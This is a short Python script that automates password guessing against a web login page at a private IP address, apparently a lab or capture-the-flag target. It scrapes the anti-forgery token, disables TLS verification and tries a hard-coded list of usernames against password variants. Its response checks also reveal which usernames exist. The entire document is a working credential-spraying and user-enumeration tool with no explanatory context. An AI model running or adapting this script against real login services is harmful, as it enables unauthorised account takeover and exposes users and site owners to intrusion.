#!/usr/bin/env python3
import re

import requests
import urllib3

urllib3.disable_warnings()
LOGIN = "https://10.129.242.196/Login"


def attempt(user, pw):
    s = requests.Session()
    s.verify = False
    r0 = s.get(LOGIN, timeout=15)
    tok = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r0.text).group(1)
    r = s.post(LOGIN, data={"Username": user, "Password": pw, "RememberMe": "false",
                            "__RequestVerificationToken": tok},
               timeout=20, allow_redirects=False)
    if r.status_code in (301, 302):
        return f"*** SUCCESS redirect -> {r.headers.get('Location')} ***"
    if "Login attempt failed" in r.text:
        return "fail (user exists, bad password)"
    if "Invalid login attempt" in r.text:
        return "invalid (user not known to SSO)"
    return f"other {r.status_code} len={len(r.text)}"


users = ["johnathan.j", "auditor", "will.s", "mark.s", "ashley.b"]
pws = ["th1s_p@ssw()rd!!", "change*th1s_p@ssw()rd!!", "th1s_p@ssw()rd",
       "p@ssw()rd!!", "change*th1s_p@ssw()rd", "Changeth1s_p@ssw()rd!!"]

for u in users[:2]:
    for pw in pws:
        print(f"{u:14s} {pw:26s} -> {attempt(u, pw)}", flush=True)
